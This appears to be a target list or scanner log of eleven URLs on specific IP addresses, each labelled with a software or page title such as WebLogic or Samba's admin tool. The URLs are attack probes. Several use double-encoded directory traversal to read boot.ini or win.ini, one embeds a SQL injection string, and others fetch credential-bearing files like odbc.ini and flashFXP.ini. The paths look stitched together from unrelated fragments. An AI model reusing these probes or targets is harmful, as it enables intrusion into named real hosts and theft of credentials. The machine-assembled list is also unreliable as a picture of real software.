+PHPCounter 7.* - web,http://210-242-146-178.hinet-ip.hinet.net/comments/.br/odbc.ini
RemotelyAnywhere - Microsoft,http://210.242.147.145/login/admin/flashFXP.ini
AppServ,http://203.105.229.142/login/servlet/pageid%3D%2522%2520and%2520/perform.ini
WebLogic Server,http://203.105.231.188/login.action/app.ini
Samba Web Administration Tool - Password,http://222.156.247.171/login/base.php/wwwroot//..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255cboot.ini
BNBT Tracker Info,http://222.156.247.163/login-us/%2522cacti/coppercop//..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255cwindows/win.ini
admin - please,http://210.203.16.164/login/addtomylist.asp/ConnectComputer/odbc.ini
Philex 0.2*,http://84.88.14.175/administration/vendor/phpunit/phpunit/src/Util/PHP/serv-u.ini
"\""index.of.personal\""",http://210.242.146.156/login/axis-cgi/components/com_forum/vsadmin/suse/flashFXP.ini
Login Form Login: Password: My Resource six with him from ...,http://210.242.149.160/login/.br/webmail./-1%2520OR%25202%2B90-90-1%3D0%2B0%2B0%2B1%2520--%2520.ini
microsoft - Remote,http://103.224.193.160/login/vsadmin/perform.ini
